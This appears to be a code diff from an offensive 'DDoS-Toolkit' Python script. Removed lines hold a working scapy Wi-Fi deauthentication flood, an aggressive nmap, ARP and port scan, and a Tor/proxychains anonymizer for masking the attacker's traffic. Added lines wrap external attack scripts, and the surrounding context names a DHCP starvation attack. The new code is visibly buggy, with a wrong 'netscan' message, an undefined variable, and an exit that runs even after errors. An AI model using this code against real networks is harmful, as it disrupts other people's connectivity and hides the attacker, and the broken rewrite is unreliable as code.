@@ -519,139 +519,101 @@ def dhcp_starvation(duration: int, interface: str = "eth0") -> None:
     finally:
         print(f"{GREEN}DHCP starvation attack completed.{RESET}")
 
-def wifi_deauth(interface: str = "wlan0", duration: int = 60) -> None:
+def wifi_deauth(mode):
     """Perform Wi-Fi deauthentication attack."""
-    if not check_root():
-        print(f"{RED}Wi-Fi deauthentication requires root privileges.{RESET}")
-        return
-
-    print(f"{GREEN}Starting Wi-Fi deauthentication attack on {interface} for {duration} seconds...{RESET}")
-    start_time = time.time()
-    
     try:
-        # Put interface in monitor mode
-        subprocess.run(["airmon-ng", "start", interface], check=True)
-        monitor_iface = f"{interface}mon"
+        wifideauth_path = "/opt/DDoS-Toolkit/assets/wifideauth"
         
-        while time.time() - start_time < duration and not stop_event.is_set():
-            # Send deauthentication packets to broadcast
-            packet = scapy.RadioTap() / \
-                    scapy.Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", 
-                               addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55") / \
-                    scapy.Dot11Deauth()
-            
-            scapy.sendp(packet, iface=monitor_iface, count=10, verbose=False)
-            time.sleep(1)
+        if not os.path.isfile(wifideauth_path):
+            print(f"{RED}[!] netscan not found in /opt/DDoS-Toolkit/assets/ ...... Aborting.{RESET}")
+            return
+
+        if not shutil.which("python3"):
+            print(f"{RED}[!] Python3 is not installed or not in PATH. Please install it to proceed.{RESET}")
+            return
+
+        command = ["python3", wifideauth_path, "wlan0"]
+
+        print(f"{BLUE}[*] Starting network scan on wlan0..{RESET}")
+        subprocess.run(command, check=True)
+
+        print(f"{GREEN}[+] Network scan on {target_ip} completed successfully.{RESET}")
+    except subprocess.CalledProcessError as cpe:
+        print(f"{RED}[!] Error during network scan: {cpe}.{RESET}")
+    except FileNotFoundError as fnf:
+        print(f"{RED}[!] Required file or command not found: {fnf}.{RESET}")
     except Exception as e:
-        logger.error(f"Error during Wi-Fi deauthentication: {e}")
-    finally:
-        # Stop monitor mode
-        subprocess.run(["airmon-ng", "stop", monitor_iface], check=True)
-        print(f"{GREEN}Wi-Fi deauthentication attack completed.{RESET}")
-
-def run_network_scanner(target: str) -> None:
-    """Run comprehensive network scan against target."""
-    if not check_root():
-        print(f"{RED}Network scanning requires root privileges.{RESET}")
-        return
-
+        print(f"{RED}[!] An unexpected error occurred: {e}.{RESET}")
+        
+def run_network_scanner(target_ip):
+    """Run network scanning tool against target IP."""
     try:
-        print(f"{GREEN}Starting comprehensive network scan on {target}...{RESET}")
+        netscan_path = "/opt/DDoS-Toolkit/assets/netscan"
         
-        # Nmap scan
-        nmap_cmd = ["nmap", "-sS", "-sV", "-O", "-T4", "-A", "-v", target]
-        subprocess.run(nmap_cmd, check=True)
-        
-        # ARP scan
-        print(f"\n{GREEN}Performing ARP scan...{RESET}")
-        ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=target), timeout=2, verbose=True)
-        
-        # Port scan
-        print(f"\n{GREEN}Performing TCP port scan...{RESET}")
-        open_ports = []
-        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 3306, 3389]
-        
-        for port in common_ports:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1)
-            result = sock.connect_ex((target, port))
-            if result == 0:
-                open_ports.append(port)
-            sock.close()
-        
-        print(f"Open ports: {open_ports}")
-        
-        print(f"\n{GREEN}Network scan completed.{RESET}")
-    except Exception as e:
-        logger.error(f"Error during network scan: {e}")
+        if not os.path.isfile(netscan_path):
+            print(f"{RED}[!] netscan not found in /opt/DDoS-Toolkit/assets/ ...... Aborting.{RESET}")
+            return
 
-def run_anonymizer(mode: str) -> None:
+        if not shutil.which("python3"):
+            print(f"{RED}[!] Python3 is not installed or not in PATH. Please install it to proceed.{RESET}")
+            return
+
+        command = ["python3", netscan_path, "-t", target_ip]
+
+        print(f"{BLUE}[*] Starting network scan on {target_ip}...{RESET}")
+        subprocess.run(command, check=True)
+
+        print(f"{GREEN}[+] Network scan on {target_ip} completed successfully.{RESET}")
+
+    except subprocess.CalledProcessError as cpe:
+        print(f"{RED}[!] Error during network scan: {cpe}.{RESET}")
+    except FileNotFoundError as fnf:
+        print(f"{RED}[!] Required file or command not found: {fnf}.{RESET}")
+    except Exception as e:
+        print(f"{RED}[!] An unexpected error occurred: {e}.{RESET}")
+
+def run_anonymizer(mode):
     """Run anonymizer script to mask network traffic."""
-    if not check_root():
-        print(f"{RED}Anonymizer requires root privileges.{RESET}")
-        return
-
     try:
-        if mode == "start":
-            print(f"{GREEN}Starting anonymizer (Tor + Proxychains)...{RESET}")
-            # Start Tor service
-            subprocess.run(["service", "tor", "start"], check=True)
-            # Configure proxychains
-            with open("/etc/proxychains.conf", "a") as f:
-                f.write("\nsocks5 127.0.0.1 9050\n")
-            print(f"{GREEN}Anonymizer started successfully.{RESET}")
-        elif mode == "stop":
-            print(f"{GREEN}Stopping anonymizer...{RESET}")
-            # Stop Tor service
-            subprocess.run(["service", "tor", "stop"], check=True)
-            # Restore proxychains config
-            subprocess.run(["cp", "/etc/proxychains.conf.bak", "/etc/proxychains.conf"], check=True)
-            print(f"{GREEN}Anonymizer stopped successfully.{RESET}")
+        anonymizer_path = "/opt/DDoS-Toolkit/assets/anonymizer"
+        
+        if not os.path.isfile(anonymizer_path):
+            print(f"{RED}[ERROR] anonymizer script not found in {anonymizer_path}. Aborting.{RESET}")
+            sys.exit(1)
+        
+        if mode not in ["start", "stop"]:
+            print(f"{YELLOW}[WARNING] Invalid mode '{mode}' specified. Please use 'start' or 'stop'.{RESET}")
+            sys.exit(1)
+        
+        command = ["bash", anonymizer_path, mode]
+        
+        action_message = "Starting" if mode == "start" else "Stopping"
+        print(f"{BLUE}[INFO] {action_message} anonymizer...{RESET}")
+        
+        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        
+        if result.returncode == 0:
+            print(f"{GREEN}[SUCCESS] anonymizer {mode} completed successfully!{RESET}")
+        else:
+            print(f"{RED}[ERROR] anonymizer {mode} failed with return code {result.returncode}.{RESET}")
+            print(f"{RED}[DETAILS] {result.stderr.strip()}{RESET}")
+            sys.exit(1)
+    
+    except FileNotFoundError:
+        print(f"{RED}[ERROR] 'bash' not found. Ensure bash is installed and available in PATH.{RESET}")
+        sys.exit(1)
+    
+    except subprocess.SubprocessError as e:
+        print(f"{RED}[ERROR] Subprocess error occurred: {e}{RESET}")
+        sys.exit(1)
+    
     except Exception as e:
-        logger.error(f"Error during anonymizer operation: {e}")
-
-async def resolve_target(target_url: str) -> Optional[str]:
-    """Resolve domain name to IP address with caching."""
-    try:
-        domain_or_ip = target_url.split("//")[-1].split("/")[0].split(":")[0]
-        
-        if is_valid_ip(domain_or_ip):
-            print(f"{GREEN}Target is an IP address: {domain_or_ip}{RESET}")
-            return domain_or_ip
-        
-        # Check if we have a cached resolution
-        cache_file = "/tmp/ddos_toolkit_dns_cache.json"
-        dns_cache = {}
-        
-        if os.path.exists(cache_file):
-            with open(cache_file, "r") as f:
-                dns_cache = json.load(f)
-                
-        if domain_or_ip in dns_cache:
-            if time.time() - dns_cache[domain_or_ip]["timestamp"] < 3600:  # 1 hour cache
-                print(f"{GREEN}Using cached DNS resolution for {domain_or_ip}: {dns_cache[domain_or_ip]['ip']}{RESET}")
-                return dns_cache[domain_or_ip]["ip"]
-        
-        # Perform fresh DNS resolution
-        resolver = dns.resolver.Resolver()
-        resolver.nameservers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']  # Google, Cloudflare, Quad9
-        answer = resolver.resolve(domain_or_ip, "A")
-        ip = answer[0].to_text()
-        
-        # Update cache
-        dns_cache[domain_or_ip] = {
-            "ip": ip,
-            "timestamp": time.time()
-        }
-        
-        with open(cache_file, "w") as f:
-            json.dump(dns_cache, f)
-        
-        print(f"{GREEN}Resolved {domain_or_ip} to IP: {ip}{RESET}")
-        return ip
-    except Exception as e:
-        logger.error(f"Failed to resolve domain: {e}")
-        return None
+        print(f"{RED}[ERROR] An unexpected error occurred: {e}.{RESET}")
+        sys.exit(1)
+    
+    finally:
+        print(f"{BLUE}[INFO] Exiting anonymizer handler.{RESET}")
+        sys.exit(0)
 
 def is_valid_ip(ip: str) -> bool:
     """Check if string is a valid IP address."""
